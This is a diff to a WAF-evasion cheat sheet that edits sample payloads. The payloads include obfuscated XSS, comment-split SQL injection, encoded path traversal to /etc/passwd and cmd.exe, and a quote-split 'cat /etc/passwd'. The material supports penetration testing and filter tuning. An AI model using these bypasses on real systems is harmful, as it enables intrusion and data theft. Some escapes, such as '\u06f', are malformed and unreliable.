@@ -1857,7 +1857,7 @@ __Standard__: `<script>alert()</script>`
 __Bypassed__: `<ScRipT>alert()</sCRipT>`
 
 __Standard__: `SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'`  
-__Bypassed__: `sELecT * FrOM all_tables whERe OWNER = 'DATABASE_NAME'`
+__Bypassed__: `sELecT * FrOm all_tables whERe OWNER = 'DATABASE_NAME'`
 
 __2. URL Encoding__  
 - Encode normal payloads with % encoding/URL encoding.
@@ -1875,11 +1875,11 @@ __3. Unicode Encoding__
 - ASCII characters in unicode encoding encoding provide great variants for bypassing.
 - You can encode entire/part of the payload for obtaining results.
 
-__Standard__: `prompt()`  
-__Obfuscated__: `\u0070r\u06f\u006dpt()`
+__Standard__: `<marquee onstart=prompt()>`  
+__Obfuscated__: `<marquee onstart=\u0070r\u06f\u006dpt()>`
 
 __Blocked__: `/?redir=http://google.com`  
-__Bypassed__: `/?redir=http://google。com`
+__Bypassed__: `/?redir=http://google。com` (Unicode alternative) 
 
 __Standard__: `../../etc/passwd`  
 __Obfuscated__: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`
@@ -1910,8 +1910,8 @@ __6. Using Comments__
 __Blocked__: `<script>alert()</script>`  
 __Bypassed__: `<!--><script>alert/**/()/**/</script>`
 
-__Blocked__: `/?id=1+union+select+1,2,3---`  
-__Bypassed__: `/?id=1+un/**/ion+sel/**/ect+1,2,3-`
+__Blocked__: `/?id=1+union+select+1,2,3--`  
+__Bypassed__: `/?id=1+un/**/ion+sel/**/ect+1,2,3--`
 
 __7. Double Encoding__
 - Often WAF filters tend to encode characters to prevent attacks.
@@ -1920,8 +1920,8 @@ __7. Double Encoding__
 __Standard__: `http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\`  
 __Obfuscated__: `http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\`
 
-__Standard__: `<script>alert('XSS')</script>`  
-__Obfuscated__: `%253Cscript%253Ealert('XSS')%253C%252Fscript%253E`
+__Standard__: `<script>alert()</script>`  
+__Obfuscated__: `%253Cscript%253Ealert()%253C%252Fscript%253E`
 
 __8. Wildcard Encoding__
 - Globbing patterns are used by various command-line utilities to work with multiple files.
@@ -1944,7 +1944,7 @@ __Standard__: `<svg/onload-location=javascript:alert%281%29;//`
 __Obfuscated__: ```<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//```
 
 __Standard__: `/bin/cat /etc/passwd`  
-__Obfuscated__: `/bi'n'''/c''at' /e'tc'/pa'''ss'wd`
+__Obfuscated__: `/bi'n'''/c''at' /e'tc'/pa''ss'wd`
 > Bash allows path concatenation for execution.
 
 __Standard__: `<iframe/onload='this["src"]="javascript:alert()"';>`  
